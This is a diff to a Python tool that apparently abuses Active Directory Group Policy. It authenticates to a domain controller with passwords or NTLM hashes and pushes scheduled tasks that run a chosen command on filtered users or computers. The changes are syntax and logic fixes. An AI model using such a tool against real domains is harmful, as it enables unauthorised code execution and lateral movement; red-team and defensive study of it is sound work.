@@ -116,16 +116,6 @@ else:
     url = '{}+ntlm-nt://{}\\{}:{}@{}'.format(protocol, domain, username, options.hashes.split(":")[1], dc_ip)
     lmhash, nthash = options.hashes.split(":")
 
-
-def get_session(address, target_ip="", username="", password="", lmhash="", nthash="", domain=""):
-    try:
-        smb_session = SMBConnection(address, target_ip)
-        smb_session.login(username, password, domain, lmhash, nthash)
-        return smb_session
-    except Exception as e:
-        logging.error("Connection error")
-        return False
-
 try:
     smb_session = SMBConnection(dc_ip, dc_ip)
     if options.k:
@@ -148,14 +138,14 @@ try:
         command=options.command,
         gpo_type="user" if options.user else "computer",
         filtercomputer=options.FilterComputer,
-        filteruser= options.FilterUser,
+        filteruser=options.FilterUser,
         sammaccount=options.Sammaccount,
-        user_sid=options.SID
+        user_sid=options.SID,
         force=options.f
     )
     if task_name:
-        if filteruser | filtercomputer:
-            if gpo.update_versions(url, domain, options.gpo_id, gpo_type="user" if options.user else "computer"):
+        if options.FilterUser or options.FilterComputer:
+            if gpo.update_versions(url, domain, options.gpo_id, "user" if options.user else "computer", options.Sammaccount, options.SID):
                 logging.info("Version updated")
             else:
                 logging.error("Error while updating versions")
@@ -169,3 +159,12 @@ try:
             logging.success("ScheduledTask {} created!".format(task_name))
 except Exception as e:
     logging.error("An error occurred. Use -vv for more details", exc_info=True)
+
+def get_session(address, target_ip="", username="", password="", lmhash="", nthash="", domain=""):
+    try:
+        smb_session = SMBConnection(address, target_ip)
+        smb_session.login(username, password, domain, lmhash, nthash)
+        return smb_session
+    except Exception as e:
+        logging.error("Connection error")
+        return False
